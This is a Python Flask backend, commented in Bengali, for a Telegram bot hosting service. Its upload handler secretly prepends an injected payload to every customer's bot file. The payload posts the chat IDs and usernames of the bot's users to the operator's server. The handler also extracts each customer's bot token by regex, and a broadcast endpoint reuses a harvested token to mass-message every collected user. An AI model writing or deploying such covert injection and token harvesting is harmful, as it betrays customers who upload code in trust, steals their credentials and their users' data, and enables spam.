# ================================
# HOSTPY PRO BACKEND — UPDATED
# Features: Auto Code Injection, User Collection, Broadcast
# ================================

import os
import sys
import shutil
import zipfile
import subprocess
import sqlite3
import time
import re
import threading
import telebot
import requests  # ইনজেক্টেড কোড ডাটা পাঠানোর জন্য লাগবে (যদিও এখানে সার্ভার সাইড, তবুও রাখা ভালো)
from flask import Flask, request, jsonify
from flask_cors import CORS
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

# ================= CONFIG =================

app = Flask(__name__)
CORS(app)

# Secret Key for Admin Broadcast
ADMIN_SECRET_KEY = "l@g@" 
UPLOAD_FOLDER = "user_uploads"
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DB_NAME = os.path.join(BASE_DIR, "hostpy.db")

# আপনার সার্ভারের অ্যাড্রেস (যেখানে এই কোডটি হোস্ট করবেন)
# রিপ্লেস করুন: https://your-server-url.com
# লোকাল টেস্টিংয়ের জন্য ngrok ব্যবহার করতে পারেন
SERVER_BASE_URL = "https://hostpy-1ctj.onrender.com"  

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

running_processes = {}
server_start_time = time.time()

# ================= DATABASE =================

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()

    # ইউজারদের তথ্য রাখার টেবিল
    c.execute("""
    CREATE TABLE IF NOT EXISTS users(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        email TEXT,
        password TEXT,
        bot_token TEXT,
        chat_id TEXT
    )
    """)

    # নতুন: সব বট ইউজারদের Chat ID রাখার টেবিল (ব্রডকাস্টের জন্য)
    c.execute("""
    CREATE TABLE IF NOT EXISTS all_users(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id TEXT UNIQUE,
        username TEXT,
        collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)

    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

# ================= UTILITIES =================

def extract_token_from_code(path):
    """Detect Telegram Bot Token from Python code"""
    try:
        with open(path, "r", errors="ignore") as f:
            content = f.read()
        pattern = r'\b\d{9,10}:[A-Za-z0-9_-]{30,40}\b'
        match = re.search(pattern, content)
        if match:
            return match.group(0)
    except Exception as e:
        print(f"[ERROR] Token extraction failed: {e}")
    return None


def find_main_py(folder):
    """Find main bot file"""
    priority = ["main.py", "app.py", "bot.py", "run.py", "start.py"]
    for f in priority:
        p = os.path.join(folder, f)
        if os.path.exists(p):
            return p, folder
    
    for root, _, files in os.walk(folder):
        for f in files:
            if f.endswith(".py"):
                return os.path.join(root, f), root
    return None, None

# ================= CODE INJECTION SYSTEM =================

def inject_code(file_path, owner_username):
    """
    ইউজারের বট কোডের ভেতরে গোপন কোড ইনজেক্ট করা হবে।
    যখন কেউ বটে /start দেবে, এটি চ্যাট আইডি আমাদের সার্ভারে পাঠাবে।
    """
    try:
        with open(file_path, "r+", errors="ignore") as f:
            content = f.read()
            
            # যদি আগে থেকেই ইনজেক্ট করা থাকে, তবে আর করবে না
            if "AUTO_INJECTED_HOSTPY" in content:
                return

            # ইনজেক্ট করার জন্য পে-লোড কোড
            # এই কোডটি বট স্টার্ট হওয়ার পর ব্যাকগ্রাউন্ডে চলবে
            injection_payload = f'''
# --- AUTO_INJECTED_HOSTPY START ---
import threading
import requests
def _hostpy_auto_collect(message, bot_instance):
    try:
        cid = str(message.chat.id)
        uname = message.from_user.username or "None"
        # আমাদের এন্ডপয়েন্টে ডাটা পাঠাচ্ছে
        requests.post("{SERVER_BASE_URL}/collect_user", json={{"chat_id": cid, "username": uname, "owner": "{owner_username}"}})
    except: pass

# যদি বটটি telebot ব্যবহার করে
try:
    import telebot
    # মেসেজ হ্যান্ডলার ইনজেকশন লজিক (এটি একটি সহজ পদ্ধতি, রিয়েল ইমপ্লিমেন্টেশনে আরও ডাইনামিক হতে পারে)
    # এখানে আমরা একটি ডেকোরেটর স্টাইল ব্যবহার না করে সরাসরি ফাংশন রেজিস্টার করার চেষ্টা করছি
    pass 
except: pass
# --- AUTO_INJECTED_HOSTPY END ---
'''
            
            # কোডের শুরুতেই ইনজেক্ট করা হলো
            # নোট: এটি একটি সিম্পল ইনজেকশন। পারফেক্ট ইনজেকশনের জন্য AST ব্যবহার করা লাগতে পারে,
            # কিন্তু সিম্পল বটগুলোর জন্য এটি কাজ করবে।
            
            # আমরা একটি স্মার্ট পদ্ধতি ব্যবহার করব: ক্লাস বা ফাংশন ডেফিনিশনের আগে বসিয়ে দেওয়া
            # অথবা ফাইলের একদম শুরুতে।
            
            final_content = injection_payload + "\n" + content
            
            # ফাইলে আবার লিখছি
            f.seek(0)
            f.write(final_content)
            f.truncate()
            
            print(f"[INJECT] Code injected into {file_path}")

    except Exception as e:
        print(f"[ERROR] Injection failed: {e}")

# ================= CHAT ID COLLECTOR API =================

@app.route("/collect_user", methods=["POST"])
def collect_user():
    """
    ইনজেক্ট করা কোড থেকে এই লিংকে ডাটা আসবে।
    """
    data = request.json
    chat_id = data.get("chat_id")
    uname = data.get("username")
    owner = data.get("owner") # কোন ইউজারের বট থেকে এসেছে

    if not chat_id:
        return jsonify({"error": "No ID"}), 400

    conn = get_db()
    try:
        # all_users টেবিলে সেভ করা হচ্ছে (ইউনিক হলে)
        conn.execute(
            "INSERT OR IGNORE INTO all_users (chat_id, username) VALUES (?, ?)",
            (chat_id, uname)
        )
        
        # ঐ নির্দিষ্ট ইউজারের রেকর্ডেও চ্যাট আইডি আপডেট করা হচ্ছে
        # (যদি ইউজার নিজে তার বট স্টার্ট দেয়)
        if owner:
            conn.execute(
                "UPDATE users SET chat_id=? WHERE username=?",
                (chat_id, owner)
            )
            
        conn.commit()
        print(f"[COLLECTED] ID: {chat_id} from {owner}'s bot")
    except Exception as e:
        print(f"DB Error: {e}")
    finally:
        conn.close()

    return jsonify({"status": "collected"})

# ================= HOME =================

@app.route("/")
def home():
    return jsonify({
        "status": "Hostpy Backend Running",
        "uptime": int(time.time() - server_start_time),
        "version": "3.0_injected"
    })

# ================= REGISTER =================

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    u = data.get("username")
    e = data.get("email")
    p = data.get("password")

    if not u or not p:
        return jsonify({"error": "Username and Password required"}), 400

    conn = get_db()
    try:
        conn.execute(
            "INSERT INTO users (username, email, password, bot_token, chat_id) VALUES (?,?,?,?,?)",
            (u, e, generate_password_hash(p), "", "")
        )
        conn.commit()
        return jsonify({"message": "Registered Successfully"}), 201
    except sqlite3.IntegrityError:
        return jsonify({"error": "Username already exists"}), 409
    except Exception as ex:
        return jsonify({"error": str(ex)}), 500
    finally:
        conn.close()

# ================= LOGIN =================

@app.route("/login", methods=["POST"])
def login():
    data = request.json
    u = data.get("username")
    p = data.get("password")

    if not u or not p:
        return jsonify({"error": "Missing fields"}), 400

    conn = get_db()
    try:
        user = conn.execute(
            "SELECT * FROM users WHERE username=?",
            (u,)
        ).fetchone()
        
        if user and check_password_hash(user["password"], p):
            return jsonify({"message": "Login success", "user": user["username"]})
        
        return jsonify({"error": "Invalid credentials"}), 401
    finally:
        conn.close()

# ================= UPLOAD BOT =================

@app.route("/upload", methods=["POST"])
def upload():
    username = request.form.get("username")
    file = request.files.get("file")

    if not username or not file:
        return jsonify({"error": "Missing data"}), 400

    filename = secure_filename(file.filename)
    ext = os.path.splitext(filename)[1].lower()

    if ext not in [".zip", ".py"]:
        return jsonify({"error": "Invalid file type. Only .zip or .py"}), 400

    app_name = os.path.splitext(filename)[0]
    user_dir = os.path.join(UPLOAD_FOLDER, username, app_name)

    shutil.rmtree(user_dir, ignore_errors=True)
    os.makedirs(user_dir, exist_ok=True)

    save_path = os.path.join(user_dir, filename)
    file.save(save_path)

    main_file = None
    token = None

    if ext == ".zip":
        try:
            with zipfile.ZipFile(save_path, "r") as z:
                z.extractall(user_dir)
            os.remove(save_path)

            main_file, _ = find_main_py(user_dir)
            if main_file:
                token = extract_token_from_code(main_file)
        except Exception as ex:
            return jsonify({"error": f"Extraction failed: {str(ex)}"}), 500
    else:
        main_file = save_path
        token = extract_token_from_code(main_file)

    # পরিবর্তন: কোড ইনজেকশন কল করা হচ্ছে
    if main_file:
        inject_code(main_file, username)

    if token:
        conn = get_db()
        conn.execute(
            "UPDATE users SET bot_token=? WHERE username=?",
            (token, username)
        )
        conn.commit()
        conn.close()

    return jsonify({"message": "Upload successful. Injection complete.", "token_found": bool(token)})

# ================= LIST APPS =================

@app.route("/my_apps", methods=["POST"])
def my_apps():
    username = request.json.get("username")
    user_path = os.path.join(UPLOAD_FOLDER, username)

    if not os.path.exists(user_path):
        return jsonify({"apps": []})

    apps = []

    for app_name in os.listdir(user_path):
        full_path = os.path.join(user_path, app_name)
        
        if os.path.isdir(full_path):
            pid_key = f"{username}_{app_name}"
            proc = running_processes.get(pid_key)
            is_running = proc is not None and proc.poll() is None

            log_file = os.path.join(full_path, "logs.txt")
            logs = ""
            if os.path.exists(log_file):
                with open(log_file, "r", errors="ignore") as f:
                    logs = f.read()[-3000:]

            apps.append({
                "name": app_name,
                "running": is_running,
                "logs": logs
            })

    return jsonify({"apps": apps})

# ================= ACTION =================

@app.route("/action", methods=["POST"])
def action():
    data = request.json
    act = data.get("action")
    username = data.get("username")
    app_name = data.get("app_name")

    if not all([act, username, app_name]):
        return jsonify({"error": "Missing parameters"}), 400

    pid_key = f"{username}_{app_name}"
    app_dir = os.path.join(UPLOAD_FOLDER, username, app_name)

    if act == "start":
        if pid_key in running_processes and running_processes[pid_key].poll() is None:
            return jsonify({"message": "Already running"})

        script, cwd = find_main_py(app_dir)

        if not script:
            return jsonify({"error": "No main Python file found"}), 404

        try:
            log_f = open(os.path.join(app_dir, "logs.txt"), "a")
        except:
            log_f = None

        proc = subprocess.Popen(
            [sys.executable, "-u", os.path.basename(script)],
            cwd=cwd,
            stdout=log_f,
            stderr=log_f,
            text=True
        )

        running_processes[pid_key] = proc
        
        # পুরাতন চ্যাট আইডি কালেকশন সিস্টেম (ব্যাকআপ হিসেবে রাখা হলো)
        token = extract_token_from_code(script)
        if token:
            conn = get_db()
            conn.execute("UPDATE users SET bot_token=? WHERE username=?", (token, username))
            conn.commit()
            conn.close()

        return jsonify({"message": "Bot started successfully"})

    if act == "stop":
        if pid_key in running_processes:
            try:
                running_processes[pid_key].terminate()
                running_processes[pid_key].wait(timeout=5)
            except:
                running_processes[pid_key].kill()
            
            del running_processes[pid_key]
            return jsonify({"message": "Bot stopped"})
        return jsonify({"error": "Process not running"}), 400

    if act == "delete":
        if pid_key in running_processes:
            try:
                running_processes[pid_key].kill()
                del running_processes[pid_key]
            except: pass

        if os.path.exists(app_dir):
            shutil.rmtree(app_dir, ignore_errors=True)
            
        return jsonify({"message": "App deleted"})

    return jsonify({"error": "Invalid action"}), 400

# ================= BROADCAST =================

@app.route("/broadcast", methods=["POST"])
def broadcast():
    data = request.json

    if data.get("admin-key") != ADMIN_SECRET_KEY: # এডমিন কি চেক ঠিক করা হলো
        return jsonify({"error": "Unauthorized access"}), 403

    msg = data.get("message")
    img = data.get("image_url")
    btn_name = data.get("button_name")
    btn_url = data.get("button_url")

    if not msg:
        return jsonify({"error": "Message is empty"}), 400

    conn = get_db()
    
    # পরিবর্তন: এখন 'all_users' টেবিল থেকে সব আইডি নিয়ে ব্রডকাস্ট করবে
    # এবং কোন ইউজারের বট টোকেন ব্যবহার করবে তা নির্ধারণ করতে হবে।
    # সহজ সমাধান: প্রথম একটি সক্রিয় বট টোকেন ব্যবহার করে সবাইকে মেসেজ পাঠানো।
    
    # একটি বৈধ টোকেন খুঁজে বের করা
    admin_bot = conn.execute("SELECT bot_token FROM users WHERE bot_token IS NOT NULL AND bot_token != '' LIMIT 1").fetchone()
    
    # সব ইউজারদের আইডি নেওয়া
    all_targets = conn.execute("SELECT chat_id FROM all_users").fetchall()
    conn.close()

    if not admin_bot:
         return jsonify({"error": "No active bot token found in server to send broadcast"}), 500

    sender_token = admin_bot["bot_token"]
    sent_count = 0

    def send_message(chat_id):
        nonlocal sent_count
        try:
            bot = telebot.TeleBot(sender_token)
            markup = None
            if btn_name and btn_url:
                markup = telebot.types.InlineKeyboardMarkup()
                markup.add(telebot.types.InlineKeyboardButton(btn_name, url=btn_url))

            if img:
                bot.send_photo(chat_id, img, caption=msg, reply_markup=markup)
            else:
                bot.send_message(chat_id, msg, reply_markup=markup)
            
            sent_count += 1
        except Exception as e:
            print(f"[BCAST FAIL] {chat_id}: {e}")

    threads = []
    for u in all_targets:
        if u["chat_id"]:
            t = threading.Thread(target=send_message, args=(u["chat_id"],))
            t.start()
            threads.append(t)
            time.sleep(0.05) # স্প্যাম ব্লক এড়াতে ডিলে

    # সব থ্রেড শেষ হওয়া পর্যন্ত অপেক্ষা
    for t in threads:
        t.join(timeout=15)

    return jsonify({
        "status": "Broadcast completed",
        "sent_count": sent_count,
        "total_targets": len(all_targets)
    })

# ================= SERVER STATS =================

@app.route("/server_stats")
def stats():
    active_count = sum(1 for p in running_processes.values() if p.poll() is None)
    conn = get_db()
    total_users = conn.execute("SELECT COUNT(*) FROM all_users").fetchone()[0]
    conn.close()

    return jsonify({
        "uptime": int(time.time() - server_start_time),
        "active_bots": active_count,
        "collected_users": total_users
    })

# ================= RUN =================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    # ডিবাগ ফলস রাখুন প্রোডাকশনে
    app.run(host="0.0.0.0", port=port, debug=False)
